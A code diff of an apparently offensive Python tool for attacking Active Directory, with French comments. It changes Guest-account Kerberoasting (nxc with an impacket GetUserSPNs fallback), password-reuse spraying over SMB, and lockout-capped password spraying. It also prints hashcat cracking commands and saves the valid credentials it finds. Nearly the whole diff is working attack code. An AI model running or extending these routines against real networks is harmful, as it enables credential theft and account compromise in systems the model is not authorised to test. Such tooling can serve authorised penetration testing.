@@ -719,16 +719,25 @@ def phase1_unauth(hosts, args, state):
         crack_hashes(args, state)
 
 def kerberoast_guest(args, state, dc):
-    """Kerberoast via Guest / session anonyme (foothold sans creds valides, cf. Op. Endgame)."""
-    nxc = nxc_bin()
-    if not (nxc and args.domain):
+    """Kerberoast via Guest / compte anonyme (foothold sans creds valides, cf. Op. Endgame)."""
+    if not args.domain:
         return
+    nxc = nxc_bin()
     outfile = os.path.join(args.loot, "kerberoast.hashes")
-    log(f"{C.GR}[i] {nxc} : Kerberoast via Guest (sans creds)...{C.X}")
-    rc, out, _ = run_cmd([nxc, "ldap", dc, "-u", "guest", "-p", "", "-d", args.domain,
-                          "--kerberoasting", outfile], 180)
-    if os.path.isfile(outfile) and os.path.getsize(outfile) > 0:
-        add_finding(state, "HIGH", "Kerberoast via Guest (sans creds valides)",
+    got = lambda: os.path.isfile(outfile) and os.path.getsize(outfile) > 0
+    # 1) nxc ldap avec Guest
+    if nxc:
+        log(f"{C.GR}[i] {nxc} : Kerberoast via Guest (sans creds)...{C.X}")
+        run_cmd([nxc, "ldap", dc, "-u", "guest", "-p", "", "-d", args.domain,
+                 "--kerberoasting", outfile], 180)
+    # 2) fallback impacket : GetUserSPNs avec Guest (mot de passe vide)
+    if not got() and have("GetUserSPNs.py"):
+        log(f"{C.GR}[i] GetUserSPNs via Guest (fallback impacket)...{C.X}")
+        run_cmd(["GetUserSPNs.py", f"{args.domain}/guest:", "-dc-ip", dc, "-request",
+                 "-outputfile", outfile], 180)
+    if got():
+        n = len(open(outfile, encoding="utf-8", errors="ignore").read().splitlines())
+        add_finding(state, "HIGH", f"Kerberoast via Guest : {n} ticket(s) service (sans creds)",
                     f"hashcat -m 13100 {outfile} rockyou.txt", dc)
         state.setdefault("hashes", {})["kerberoast"] = outfile
 
@@ -741,19 +750,21 @@ def spray_reuse(args, state, dc):
             if c.get("password") and c["password"] not in sprayed]
     if not (nxc and os.path.isfile(ufile) and pwds):
         return
-    log(f"{C.GR}[i] Reutilisation de mdp : spray de {len(set(pwds))} mdp connu(s) sur les users...{C.X}")
-    for pw in set(pwds):
-        sprayed.add(pw)
-        rc, out, _ = run_cmd([nxc, "smb", dc, "-u", ufile, "-p", pw, "--continue-on-success"]
-                             + (["-d", args.domain] if args.domain else []), 300)
-        for m in re.finditer(r"\[\+\]\s*([^\\\s]+)\\([^\s:]+):(\S+)", out):
-            user = m.group(2)
-            if not any(c.get("user") == user and c.get("password") == pw
-                       for c in state.get("creds", [])):
-                state.setdefault("creds", []).append(
-                    {"user": user, "password": pw, "hash": None, "src": "reuse"})
-                add_finding(state, "HIGH", f"Reutilisation de mot de passe : {user}:{pw}",
-                            "meme mdp qu'un autre compte -> re-enum (boucle)", dc)
+    newpw = sorted(set(pwds))
+    for p in newpw:
+        sprayed.add(p)
+    log(f"{C.GR}[i] Reutilisation de mdp : {len(newpw)} mdp connu(s) sur les users (1 passe nxc)...{C.X}")
+    pfile = save_loot(args, "reuse_pw.txt", "\n".join(newpw) + "\n")
+    rc, out, _ = run_cmd([nxc, "smb", dc, "-u", ufile, "-p", pfile, "--continue-on-success"]
+                         + (["-d", args.domain] if args.domain else []), 1200)
+    for m in re.finditer(r"\[\+\]\s*([^\\\s]+)\\([^\s:]+):(\S+)", out):
+        user, pw = m.group(2), m.group(3)
+        if not any(c.get("user") == user and c.get("password") == pw
+                   for c in state.get("creds", [])):
+            state.setdefault("creds", []).append(
+                {"user": user, "password": pw, "hash": None, "src": "reuse"})
+            add_finding(state, "HIGH", f"Reutilisation de mot de passe : {user}:{pw}",
+                        "meme mdp qu'un autre compte -> re-enum (boucle)", dc)
 
 def phase_asrep(dc, args, state, label=""):
     """AS-REP roasting : comptes DONT_REQ_PREAUTH -> hash crackable."""
@@ -804,37 +815,35 @@ def phase2_password(hosts, args, state):
         return
     thr = state.get("lockout_threshold")
     log(f"{C.GR}[i] Lockout threshold connu : {thr}{C.X}")
-    # passwordlist fournie (capee a 500 pour rester lockout-safe) ou liste integree
     if getattr(args, "passwordlist", None) and os.path.isfile(args.passwordlist):
         with open(args.passwordlist, encoding="utf-8", errors="ignore") as f:
-            passwords = [l.strip() for l in f if l.strip() and not l.startswith("#")][:500]
-        log(f"{C.GR}[i] Passwordlist : {len(passwords)} mdp (capee a 500){C.X}")
+            passwords = [l.strip() for l in f if l.strip() and not l.startswith("#")]
     else:
         passwords = default_passwords(args)
-    # lockout-aware : on limite le nombre de mots de passe testes
+    # un SPRAY teste PEU de mdp (sinon = brute + lockout). Cap selon la policy.
     if thr and thr > 0:
-        safe_n = max(1, thr - 2)
-        if len(passwords) > safe_n:
-            log(f"{C.R}[!] Lockout={thr} -> on limite a {safe_n} mot(s) de passe "
-                f"pour NE PAS bloquer les comptes.{C.X}")
-            passwords = passwords[:safe_n]
+        cap = max(1, thr - 2)
     else:
-        log(f"{C.Y}[!] Lockout inconnu/illimite -> prudence, {len(passwords)} mdp.{C.X}")
+        cap = 12   # lockout inconnu -> on reste sur les mdp les plus probables
+    if len(passwords) > cap:
+        log(f"{C.Y}[!] Spray limite a {cap} mdp (lockout={thr}) -> "
+            f"--passwordlist pour forcer plus, mais attention au lockout.{C.X}")
+        passwords = passwords[:cap]
 
-    # userlist -> fichier
+    # UN SEUL appel nxc (users x passwords via fichiers) = rapide (nxc gere la matrice)
     ufile = os.path.join(args.loot, "users.txt")
-    log(f"{C.GR}[i] Spraying {len(passwords)} mdp x {len(users)} users (continue-on-success)...{C.X}")
+    pfile = save_loot(args, "spray_pw.txt", "\n".join(passwords) + "\n")
+    log(f"{C.GR}[i] Spray de {len(passwords)} mdp x {len(users)} users (1 passe nxc)...{C.X}")
     found = []
-    for pw in passwords:
-        rc, out, _ = run_cmd([nxc, "smb", dc, "-u", ufile, "-p", pw,
-                             "--continue-on-success"] + (["-d", args.domain] if args.domain else []), 300)
-        for m in re.finditer(r"\[\+\]\s*([^\\\s]+)\\([^\s:]+):(\S+)", out):
-            cred = {"user": m.group(2), "password": pw, "hash": None}
-            if cred not in found:
-                found.append(cred)
-                add_finding(state, "HIGH", f"Cred valide : {m.group(2)}:{pw}",
-                            "reutilisable en phase 3 (enum auth)", dc)
-        time.sleep(0.3)  # throttle leger
+    rc, out, _ = run_cmd([nxc, "smb", dc, "-u", ufile, "-p", pfile, "--continue-on-success"]
+                         + (["-d", args.domain] if args.domain else []), 1800)
+    for m in re.finditer(r"\[\+\]\s*([^\\\s]+)\\([^\s:]+):(\S+)", out):
+        user, pw = m.group(2), m.group(3)
+        if any(c["user"] == user and c["password"] == pw for c in found):
+            continue
+        found.append({"user": user, "password": pw, "hash": None})
+        add_finding(state, "HIGH", f"Cred valide : {user}:{pw}",
+                    "reutilisable en phase 3 (enum auth)", dc)
     if found:
         state.setdefault("creds", []).extend(found)
         save_loot(args, "valid_creds.txt",
